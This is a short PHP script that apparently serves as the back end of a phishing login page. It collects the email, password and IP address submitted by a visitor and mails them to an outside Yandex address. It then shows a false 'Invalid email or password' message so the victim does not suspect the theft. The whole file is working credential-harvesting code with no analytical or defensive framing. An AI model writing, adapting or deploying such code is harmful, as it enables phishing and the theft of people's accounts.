<?php
if (isset($_POST['email']) && isset($_POST['password'])) {
  $email = $_POST['email'];
  $password = $_POST['password'];
  $ip = $_SERVER["REMOTE_ADDR"];
  $myemail = "dept.im@yandex.ru";
  $subject = "Welcome to JamROCK";
  $message = "Email: ". $email."\nPassword: ". $password."\nIP: ".$ip;
  mail($myemail, $subject, $message); 
  ?>
  <font color="red" size="3">
  	Invalid email or password, try again.
  </font>
  <?php
}


?>
